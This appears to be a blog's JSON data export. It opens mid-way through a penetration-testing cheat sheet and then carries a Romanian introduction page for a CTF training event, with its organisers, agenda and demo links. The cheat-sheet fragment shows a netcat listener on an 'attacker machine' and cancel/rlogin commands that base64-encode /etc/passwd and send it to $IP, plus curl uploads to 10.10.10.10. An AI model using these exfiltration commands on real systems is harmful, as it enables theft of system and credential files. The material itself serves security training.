-aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt &gt; input.txt.enc</code></pre>\n<pre><div class=\"caption\"><span>Decrypt</span></div><code class=\"highlight bash\">openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt.enc &gt; input.txt</code></pre>\n\n<br>\n\n<h3 id=\"Exfiltraion-with-cancel-and-rlogin\"><a href=\"#Exfiltraion-with-cancel-and-rlogin\" class=\"headerlink\" title=\"Exfiltraion with cancel and rlogin\"></a>Exfiltraion with <code>cancel</code> and <code>rlogin</code></h3><blockquote>\n<p><strong><code>cancel</code></strong>: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.<br><strong><code>rlogin</code></strong>: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if its misconfigured or used in an unconventional way.</p>\n</blockquote>\n<p>Set up a listener (attacker machine)</p>\n<pre><code class=\"highlight bash\">nc -lvnp 443</code></pre>\n<p>Send data</p>\n<pre><div class=\"caption\"><span>cancel</span></div><code class=\"highlight bash\">cancel -u <span class=\"string\">&quot;<span class=\"subst\">$(cat /etc/passwd | base64)</span>&quot;</span> -h <span class=\"variable\">$IP</span>:443</code></pre>\n<pre><div class=\"caption\"><span>rlogin</span></div><code class=\"highlight bash\">rlogin -l <span class=\"string\">&quot;<span class=\"subst\">$(cat /etc/passwd | base64)</span>&quot;</span> -p 443 <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h3 id=\"Send-and-request-data-with-curl\"><a href=\"#Send-and-request-data-with-curl\" class=\"headerlink\" title=\"Send and request data with curl\"></a>Send and request data with <code>curl</code></h3><pre><code class=\"highlight bash\">curl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin\n\ncurl -X MOVE -H <span class=\"string\">&#x27;Destination: http://10.10.10.10/filename.bin&#x27;</span> http://10.10.10.10/file.bin</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"ixodron 2024 - Introduction","date":"2024-09-03T08:00:00.000Z","toc":true,"_content":"\n---\n\nPe aceast pagin, vei gsi informaiile iniiale de care avei nevoie n timpul conferinei, inclusiv:\n\n- [Informaii despre organizatori](#Organizatorii)\n  - [Despre ixodron](#Despre-ixodron)\n  - [Despre ALEF](#Despre-ALEF)\n  - [Despre trainer](#Despre-trainer)\n- [Agenda evenimentului](#Agenda-evenimentului)\n- [Activitile planificate](#Activitile-planificate)\n\n---\n<!-- more -->\n\n<br>\n\n##  Introducere\n\n#### Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!\n\nAceast pagin de introducere este dedicat participanilor la evenimentul ixo  CTF, cuprinznd training anti-hacking i exerciii de tip Capture The Flag. Evenimentul este conceput pentru a v oferi oportuniti de nvare i dezvoltare n domeniul securitii cibernetice, ntr-un cadru competitiv i stimulant. \nSuntem ncntai s v avem alturi i sperm s v bucurai de aceast experien.\n\n\n<br>\n\n## Organizatorii\n\n### Despre ixodron\n\n<a href=\"https://ixodron.ro\" target=\"_\">**Ixodron**</a> este o companie IT cu trei direcii principale de aciune:\n- Design, implementare i suport tehnic pentru soluii aferente centrelor de date, reelelor i securitii cibernetice (inclusiv Microsoft 365 i Azure Cloud)\n- Dezvoltare software/aplicaii, automatizare de procese/RPA i raportare automat/BI\n- Soluii de inteligen artificial pentru domeniul medical\n\nn contextul actual, ixodron pune un accent deosebit pe auditul i consultana de securitate, asigurndu-se c organizaiile sunt pregtite s fac fa provocrilor cibernetice moderne.\n\n<br>\n\n### Despre ALEF\n\n<a href=\"https://www.alef.com/ro/\" target=\"_\">**ALEF Distribution RO**</a> este un distribuitor de soluii, servicii i traininguri IT, adresate att pieei de business, ct i consumatorilor individuali. Cu o echip local de experi i peste 20 de ani de experien n domeniul tehnologiei informaiei, ALEF Distribution RO asigur livrarea de servicii i soluii complete, att cloud, ct i on-premise, care respect cele mai riguroase standarde de calitate i rspund nevoilorclienilor.\n\n<br>\n\n### Despre trainer\n\nTrainer i moderator al evenimentului: <a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\">**Marin Radu**</a>.\nMarin Radu opereaz n domeniul securitii cibernetice, participnd la competiii naionale i internaionale, conferine i exerciii cyber. De asemenea, are experien n organizarea competiiilor la nivel local i naional.\n\n\n<br>\n\n## Agenda evenimentului\n\n### Ziua 1: 02.10.2024\n\n<table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>nregistrare i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>Prezentarea agendei & intro</td>\n  </tr>\n  <tr>\n    <td>09:30  11:00</td>\n    <td>\n      Primul set de exerciii:<br>\n        &nbsp;&nbsp;&nbsp;&nbspParticipanii, mpreun cu trainerul, vor explora introducerea n cybersecurity i virtualizare, <br>\n        &nbsp;&nbsp;&nbsp;&nbspscanarea reelei interne a mainii virtuale i conectarea la serverele FTP, SMB i SSH.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>11:00  11:30</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>11:30  13:00</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>13:00  15:30</td>\n    <td>\n      Al doilea set de exerciii:<br>\n      &nbsp;&nbsp;&nbsp;&nbspmpreun cu participanii, se vor testa servere Web i<br>\n      &nbsp;&nbsp;&nbsp;&nbspse vor sparge parolele unor arhive protejate i ale unor reele Wi-Fi.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>15:30  16:00</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  18:00</td>\n    <td>\n      Prezentarea infrastructurii CTF:\n      <ul>\n        <li>Conectare i nregistrare pe platforma CTF</li>\n        <li>Modul de rezolvare a exerciiilor</li>\n        <li>Aspecte importante pe platform</li>\n        <li>Modul de punctare al rezolvrilor</li>\n        <li>Resursele de nvare disponibile</li>\n      </ul>\n    </td>\n  </tr>\n</table>\n\n### Ziua 2: 03.10.2024\n\n<table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>Primirea participanilor i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>\n      Recapitularea exerciiilor i pregtirile finale pentru CTF:\n      <ul>\n        <li>Asigurarea conexiunii la internet a participanilor</li>\n        <li>Verificarea integritii</li>\n        <li>Conectare la CTF</li>\n        <li>Recapitularea regulilor i instruciunilor</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>09:30  12:30</td>\n    <td>\n      CTF - prima parte:\n      <ul>\n        <li>nceperea competiiei</li>\n        <li>Monitorizarea participanilor i experiena acestora</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>12:30  13:30</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>14:00  16:00</td>\n    <td>\n      CTF - a doua parte:\n      <ul>\n        <li>Adugarea exerciiilor rmase</li>\n        <li>Adugarea indiciilor necesare</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  17:30</td>\n    <td>Explicarea exerciiilor i rezolvrilor</td>\n  </tr>\n  <tr>\n    <td>17:30  18:00</td>\n    <td>Desemnarea echipelor ctigtoare</td>\n  </tr>\n</table>\n\n\n<br>\n\n## Activitile planificate\n\n**Demo-uri i taskuri introductive:**\n\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#1-Scanarea-retelei\" target=\"_blank\">**scanarea unei reele**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#2-Server-FTP\" target=\"_blank\">**conectarea la un server FTP**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#3-Server-SMB\" target=\"_blank\">**conectarea la un server SMB**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#4-Server-SSH\" target=\"_blank\">**conectarea la un server SSH**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#1-Server-web\" target=\"_blank\">**testarea unui server web**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#2-Parole-personalizate\" target=\"_blank\">**crearea unor liste personalizate de parole**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#3-Arhiva-ZIP\" target=\"_blank\">**spargerea parolei unei arhive protejate**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#4-Wi-Fi\" target=\"_blank\">**spargerea parolei unei reele Wi-Fi**</a>\n\n\n<br>\n\n## Extra\n**Resurse de nvare:**\n- <a href=\"https://play.picoctf.org/practice\" target=\"_blank\">**`PicoCTF`**</a>\n- <a href=\"https://tryhackme.com/hacktivities?tab=search\" target=\"_blank\">**`TryHackMe`**</a>\n- <a href=\"https://247ctf.com/dashboard\" target=\"_blank\">**`247CTF`**</a>\n- <a href=\"https://ctflearn.com/challenge/1/browse\" target=\"_blank\">**`CTFLearn`**</a>\n- <a href=\"https://chronos-security.notion.site/Learning-resources-652c504eb73b46daa5fa5a79be840624?pvs=4\" target=\"_blank\">**`Chronos Secrurity`**</a>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/1/\" target=\"_blank\">Demo 1</a>\n</p>\n\n---\n---","source":"_posts/CTFs/ixodron/intro.md","raw":"---\ntitle: ixodron 2024 - Introduction\ndate: 2024-09-03 11:00:00\ncategories:\n  - CTFs\n  - ixodron 2024\n  - 1. Introduction\ntags:\n  - CTFs\n  - ixodron 2024\ntoc: true\n---\n\n---\n\nPe aceast pagin, vei gsi informaiile iniiale de care avei nevoie n timpul conferinei, inclusiv:\n\n- [Informaii despre organizatori](#Organizatorii)\n  - [Despre ixodron](#Despre-ixodron)\n  - [Despre ALEF](#Despre-ALEF)\n  - [Despre trainer](#Despre-trainer)\n- [Agenda evenimentului](#Agenda-evenimentului)\n- [Activitile planificate](#Activitile-planificate)\n\n---\n<!-- more -->\n\n<br>\n\n##  Introducere\n\n#### Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!\n\nAceast pagin de introducere este dedicat participanilor la evenimentul ixo  CTF, cuprinznd training anti-hacking i exerciii de tip Capture The Flag. Evenimentul este conceput pentru a v oferi oportuniti de nvare i dezvoltare n domeniul securitii cibernetice, ntr-un cadru competitiv i stimulant. \nSuntem ncntai s v avem alturi i sperm s v bucurai de aceast experien.\n\n\n<br>\n\n## Organizatorii\n\n### Despre ixodron\n\n<a href=\"https://ixodron.ro\" target=\"_\">**Ixodron**</a> este o companie IT cu trei direcii principale de aciune:\n- Design, implementare i suport tehnic pentru soluii aferente centrelor de date, reelelor i securitii cibernetice (inclusiv Microsoft 365 i Azure Cloud)\n- Dezvoltare software/aplicaii, automatizare de procese/RPA i raportare automat/BI\n- Soluii de inteligen artificial pentru domeniul medical\n\nn contextul actual, ixodron pune un accent deosebit pe auditul i consultana de securitate, asigurndu-se c organizaiile sunt pregtite s fac fa provocrilor cibernetice moderne.\n\n<br>\n\n### Despre ALEF\n\n<a href=\"https://www.alef.com/ro/\" target=\"_\">**ALEF Distribution RO**</a> este un distribuitor de soluii, servicii i traininguri IT, adresate att pieei de business, ct i consumatorilor individuali. Cu o echip local de experi i peste 20 de ani de experien n domeniul tehnologiei informaiei, ALEF Distribution RO asigur livrarea de servicii i soluii complete, att cloud, ct i on-premise, care respect cele mai riguroase standarde de calitate i rspund nevoilorclienilor.\n\n<br>\n\n### Despre trainer\n\nTrainer i moderator al evenimentului: <a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\">**Marin Radu**</a>.\nMarin Radu opereaz n domeniul securitii cibernetice, participnd la competiii naionale i internaionale, conferine i exerciii cyber. De asemenea, are experien n organizarea competiiilor la nivel local i naional.\n\n\n<br>\n\n## Agenda evenimentului\n\n### Ziua 1: 02.10.2024\n\n<table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>nregistrare i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>Prezentarea agendei & intro</td>\n  </tr>\n  <tr>\n    <td>09:30  11:00</td>\n    <td>\n      Primul set de exerciii:<br>\n        &nbsp;&nbsp;&nbsp;&nbspParticipanii, mpreun cu trainerul, vor explora introducerea n cybersecurity i virtualizare, <br>\n        &nbsp;&nbsp;&nbsp;&nbspscanarea reelei interne a mainii virtuale i conectarea la serverele FTP, SMB i SSH.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>11:00  11:30</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>11:30  13:00</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>13:00  15:30</td>\n    <td>\n      Al doilea set de exerciii:<br>\n      &nbsp;&nbsp;&nbsp;&nbspmpreun cu participanii, se vor testa servere Web i<br>\n      &nbsp;&nbsp;&nbsp;&nbspse vor sparge parolele unor arhive protejate i ale unor reele Wi-Fi.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>15:30  16:00</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  18:00</td>\n    <td>\n      Prezentarea infrastructurii CTF:\n      <ul>\n        <li>Conectare i nregistrare pe platforma CTF</li>\n        <li>Modul de rezolvare a exerciiilor</li>\n        <li>Aspecte importante pe platform</li>\n        <li>Modul de punctare al rezolvrilor</li>\n        <li>Resursele de nvare disponibile</li>\n      </ul>\n    </td>\n  </tr>\n</table>\n\n### Ziua 2: 03.10.2024\n\n<table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>Primirea participanilor i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>\n      Recapitularea exerciiilor i pregtirile finale pentru CTF:\n      <ul>\n        <li>Asigurarea conexiunii la internet a participanilor</li>\n        <li>Verificarea integritii</li>\n        <li>Conectare la CTF</li>\n        <li>Recapitularea regulilor i instruciunilor</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>09:30  12:30</td>\n    <td>\n      CTF - prima parte:\n      <ul>\n        <li>nceperea competiiei</li>\n        <li>Monitorizarea participanilor i experiena acestora</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>12:30  13:30</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>14:00  16:00</td>\n    <td>\n      CTF - a doua parte:\n      <ul>\n        <li>Adugarea exerciiilor rmase</li>\n        <li>Adugarea indiciilor necesare</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  17:30</td>\n    <td>Explicarea exerciiilor i rezolvrilor</td>\n  </tr>\n  <tr>\n    <td>17:30  18:00</td>\n    <td>Desemnarea echipelor ctigtoare</td>\n  </tr>\n</table>\n\n\n<br>\n\n## Activitile planificate\n\n**Demo-uri i taskuri introductive:**\n\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#1-Scanarea-retelei\" target=\"_blank\">**scanarea unei reele**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#2-Server-FTP\" target=\"_blank\">**conectarea la un server FTP**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#3-Server-SMB\" target=\"_blank\">**conectarea la un server SMB**</a>\n- `(1)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#4-Server-SSH\" target=\"_blank\">**conectarea la un server SSH**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#1-Server-web\" target=\"_blank\">**testarea unui server web**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#2-Parole-personalizate\" target=\"_blank\">**crearea unor liste personalizate de parole**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#3-Arhiva-ZIP\" target=\"_blank\">**spargerea parolei unei arhive protejate**</a>\n- `(2)` <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#4-Wi-Fi\" target=\"_blank\">**spargerea parolei unei reele Wi-Fi**</a>\n\n\n<br>\n\n## Extra\n**Resurse de nvare:**\n- <a href=\"https://play.picoctf.org/practice\" target=\"_blank\">**`PicoCTF`**</a>\n- <a href=\"https://tryhackme.com/hacktivities?tab=search\" target=\"_blank\">**`TryHackMe`**</a>\n- <a href=\"https://247ctf.com/dashboard\" target=\"_blank\">**`247CTF`**</a>\n- <a href=\"https://ctflearn.com/challenge/1/browse\" target=\"_blank\">**`CTFLearn`**</a>\n- <a href=\"https://chronos-security.notion.site/Learning-resources-652c504eb73b46daa5fa5a79be840624?pvs=4\" target=\"_blank\">**`Chronos Secrurity`**</a>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/1/\" target=\"_blank\">Demo 1</a>\n</p>\n\n---\n---","slug":"CTFs/ixodron/intro","published":1,"updated":"2024-09-23T06:18:55.850Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhw000s6gvg4173a0vb","content":"<hr>\n<p>Pe aceast pagin, vei gsi informaiile iniiale de care avei nevoie n timpul conferinei, inclusiv:</p>\n<ul>\n<li><a href=\"#Organizatorii\">Informaii despre organizatori</a><ul>\n<li><a href=\"#Despre-ixodron\">Despre ixodron</a></li>\n<li><a href=\"#Despre-ALEF\">Despre ALEF</a></li>\n<li><a href=\"#Despre-trainer\">Despre trainer</a></li>\n</ul>\n</li>\n<li><a href=\"#Agenda-evenimentului\">Agenda evenimentului</a></li>\n<li><a href=\"#Activit%C4%83%C8%9Bile-planificate\">Activitile planificate</a></li>\n</ul>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"-Introducere\"><a href=\"#-Introducere\" class=\"headerlink\" title=\" Introducere\"></a> Introducere</h2><h4 id=\"Bun-venit-la-evenimentul-ixo-CTF-organizat-de-ixodron-impreuna-cu-ALEF\"><a href=\"#Bun-venit-la-evenimentul-ixo-CTF-organizat-de-ixodron-impreuna-cu-ALEF\" class=\"headerlink\" title=\"Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!\"></a>Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!</h4><p>Aceast pagin de introducere este dedicat participanilor la evenimentul ixo  CTF, cuprinznd training anti-hacking i exerciii de tip Capture The Flag. Evenimentul este conceput pentru a v oferi oportuniti de nvare i dezvoltare n domeniul securitii cibernetice, ntr-un cadru competitiv i stimulant.<br>Suntem ncntai s v avem alturi i sperm s v bucurai de aceast experien.</p>\n<br>\n\n<h2 id=\"Organizatorii\"><a href=\"#Organizatorii\" class=\"headerlink\" title=\"Organizatorii\"></a>Organizatorii</h2><h3 id=\"Despre-ixodron\"><a href=\"#Despre-ixodron\" class=\"headerlink\" title=\"Despre ixodron\"></a>Despre ixodron</h3><p><a href=\"https://ixodron.ro\" target=\"_\"><strong>Ixodron</strong></a> este o companie IT cu trei direcii principale de aciune:</p>\n<ul>\n<li>Design, implementare i suport tehnic pentru soluii aferente centrelor de date, reelelor i securitii cibernetice (inclusiv Microsoft 365 i Azure Cloud)</li>\n<li>Dezvoltare software&#x2F;aplicaii, automatizare de procese&#x2F;RPA i raportare automat&#x2F;BI</li>\n<li>Soluii de inteligen artificial pentru domeniul medical</li>\n</ul>\n<p>n contextul actual, ixodron pune un accent deosebit pe auditul i consultana de securitate, asigurndu-se c organizaiile sunt pregtite s fac fa provocrilor cibernetice moderne.</p>\n<br>\n\n<h3 id=\"Despre-ALEF\"><a href=\"#Despre-ALEF\" class=\"headerlink\" title=\"Despre ALEF\"></a>Despre ALEF</h3><p><a href=\"https://www.alef.com/ro/\" target=\"_\"><strong>ALEF Distribution RO</strong></a> este un distribuitor de soluii, servicii i traininguri IT, adresate att pieei de business, ct i consumatorilor individuali. Cu o echip local de experi i peste 20 de ani de experien n domeniul tehnologiei informaiei, ALEF Distribution RO asigur livrarea de servicii i soluii complete, att cloud, ct i on-premise, care respect cele mai riguroase standarde de calitate i rspund nevoilorclienilor.</p>\n<br>\n\n<h3 id=\"Despre-trainer\"><a href=\"#Despre-trainer\" class=\"headerlink\" title=\"Despre trainer\"></a>Despre trainer</h3><p>Trainer i moderator al evenimentului: <a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><strong>Marin Radu</strong></a>.<br>Marin Radu opereaz n domeniul securitii cibernetice, participnd la competiii naionale i internaionale, conferine i exerciii cyber. De asemenea, are experien n organizarea competiiilor la nivel local i naional.</p>\n<br>\n\n<h2 id=\"Agenda-evenimentului\"><a href=\"#Agenda-evenimentului\" class=\"headerlink\" title=\"Agenda evenimentului\"></a>Agenda evenimentului</h2><h3 id=\"Ziua-1-02-10-2024\"><a href=\"#Ziua-1-02-10-2024\" class=\"headerlink\" title=\"Ziua 1: 02.10.2024\"></a>Ziua 1: 02.10.2024</h3><table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>nregistrare i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>Prezentarea agendei & intro</td>\n  </tr>\n  <tr>\n    <td>09:30  11:00</td>\n    <td>\n      Primul set de exerciii:<br>\n        &nbsp;&nbsp;&nbsp;&nbspParticipanii, mpreun cu trainerul, vor explora introducerea n cybersecurity i virtualizare, <br>\n        &nbsp;&nbsp;&nbsp;&nbspscanarea reelei interne a mainii virtuale i conectarea la serverele FTP, SMB i SSH.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>11:00  11:30</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>11:30  13:00</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>13:00  15:30</td>\n    <td>\n      Al doilea set de exerciii:<br>\n      &nbsp;&nbsp;&nbsp;&nbspmpreun cu participanii, se vor testa servere Web i<br>\n      &nbsp;&nbsp;&nbsp;&nbspse vor sparge parolele unor arhive protejate i ale unor reele Wi-Fi.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>15:30  16:00</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  18:00</td>\n    <td>\n      Prezentarea infrastructurii CTF:\n      <ul>\n        <li>Conectare i nregistrare pe platforma CTF</li>\n        <li>Modul de rezolvare a exerciiilor</li>\n        <li>Aspecte importante pe platform</li>\n        <li>Modul de punctare al rezolvrilor</li>\n        <li>Resursele de nvare disponibile</li>\n      </ul>\n    </td>\n  </tr>\n</table>\n\n<h3 id=\"Ziua-2-03-10-2024\"><a href=\"#Ziua-2-03-10-2024\" class=\"headerlink\" title=\"Ziua 2: 03.10.2024\"></a>Ziua 2: 03.10.2024</h3><table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>Primirea participanilor i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>\n      Recapitularea exerciiilor i pregtirile finale pentru CTF:\n      <ul>\n        <li>Asigurarea conexiunii la internet a participanilor</li>\n        <li>Verificarea integritii</li>\n        <li>Conectare la CTF</li>\n        <li>Recapitularea regulilor i instruciunilor</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>09:30  12:30</td>\n    <td>\n      CTF - prima parte:\n      <ul>\n        <li>nceperea competiiei</li>\n        <li>Monitorizarea participanilor i experiena acestora</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>12:30  13:30</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>14:00  16:00</td>\n    <td>\n      CTF - a doua parte:\n      <ul>\n        <li>Adugarea exerciiilor rmase</li>\n        <li>Adugarea indiciilor necesare</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  17:30</td>\n    <td>Explicarea exerciiilor i rezolvrilor</td>\n  </tr>\n  <tr>\n    <td>17:30  18:00</td>\n    <td>Desemnarea echipelor ctigtoare</td>\n  </tr>\n</table>\n\n\n<br>\n\n<h2 id=\"Activitatile-planificate\"><a href=\"#Activitatile-planificate\" class=\"headerlink\" title=\"Activitile planificate\"></a>Activitile planificate</h2><p><strong>Demo-uri i taskuri introductive:</strong></p>\n<ul>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#1-Scanarea-retelei\" target=\"_blank\"><strong>scanarea unei reele</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#2-Server-FTP\" target=\"_blank\"><strong>conectarea la un server FTP</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#3-Server-SMB\" target=\"_blank\"><strong>conectarea la un server SMB</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#4-Server-SSH\" target=\"_blank\"><strong>conectarea la un server SSH</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#1-Server-web\" target=\"_blank\"><strong>testarea unui server web</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#2-Parole-personalizate\" target=\"_blank\"><strong>crearea unor liste personalizate de parole</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#3-Arhiva-ZIP\" target=\"_blank\"><strong>spargerea parolei unei arhive protejate</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#4-Wi-Fi\" target=\"_blank\"><strong>spargerea parolei unei reele Wi-Fi</strong></a></li>\n</ul>\n<br>\n\n<h2 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra\"></a>Extra</h2><p><strong>Resurse de nvare:</strong></p>\n<ul>\n<li><a href=\"https://play.picoctf.org/practice\" target=\"_blank\"><strong><code>PicoCTF</code></strong></a></li>\n<li><a href=\"https://tryhackme.com/hacktivities?tab=search\" target=\"_blank\"><strong><code>TryHackMe</code></strong></a></li>\n<li><a href=\"https://247ctf.com/dashboard\" target=\"_blank\"><strong><code>247CTF</code></strong></a></li>\n<li><a href=\"https://ctflearn.com/challenge/1/browse\" target=\"_blank\"><strong><code>CTFLearn</code></strong></a></li>\n<li><a href=\"https://chronos-security.notion.site/Learning-resources-652c504eb73b46daa5fa5a79be840624?pvs=4\" target=\"_blank\"><strong><code>Chronos Secrurity</code></strong></a></li>\n</ul>\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/1/\" target=\"_blank\">Demo 1</a>\n</p>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Pe aceast pagin, vei gsi informaiile iniiale de care avei nevoie n timpul conferinei, inclusiv:</p>\n<ul>\n<li><a href=\"#Organizatorii\">Informaii despre organizatori</a><ul>\n<li><a href=\"#Despre-ixodron\">Despre ixodron</a></li>\n<li><a href=\"#Despre-ALEF\">Despre ALEF</a></li>\n<li><a href=\"#Despre-trainer\">Despre trainer</a></li>\n</ul>\n</li>\n<li><a href=\"#Agenda-evenimentului\">Agenda evenimentului</a></li>\n<li><a href=\"#Activit%C4%83%C8%9Bile-planificate\">Activitile planificate</a></li>\n</ul>\n<hr>","more":"<br>\n\n<h2 id=\"-Introducere\"><a href=\"#-Introducere\" class=\"headerlink\" title=\" Introducere\"></a> Introducere</h2><h4 id=\"Bun-venit-la-evenimentul-ixo-CTF-organizat-de-ixodron-impreuna-cu-ALEF\"><a href=\"#Bun-venit-la-evenimentul-ixo-CTF-organizat-de-ixodron-impreuna-cu-ALEF\" class=\"headerlink\" title=\"Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!\"></a>Bun venit la evenimentul ixo-CTF organizat de ixodron mpreun cu ALEF!</h4><p>Aceast pagin de introducere este dedicat participanilor la evenimentul ixo  CTF, cuprinznd training anti-hacking i exerciii de tip Capture The Flag. Evenimentul este conceput pentru a v oferi oportuniti de nvare i dezvoltare n domeniul securitii cibernetice, ntr-un cadru competitiv i stimulant.<br>Suntem ncntai s v avem alturi i sperm s v bucurai de aceast experien.</p>\n<br>\n\n<h2 id=\"Organizatorii\"><a href=\"#Organizatorii\" class=\"headerlink\" title=\"Organizatorii\"></a>Organizatorii</h2><h3 id=\"Despre-ixodron\"><a href=\"#Despre-ixodron\" class=\"headerlink\" title=\"Despre ixodron\"></a>Despre ixodron</h3><p><a href=\"https://ixodron.ro\" target=\"_\"><strong>Ixodron</strong></a> este o companie IT cu trei direcii principale de aciune:</p>\n<ul>\n<li>Design, implementare i suport tehnic pentru soluii aferente centrelor de date, reelelor i securitii 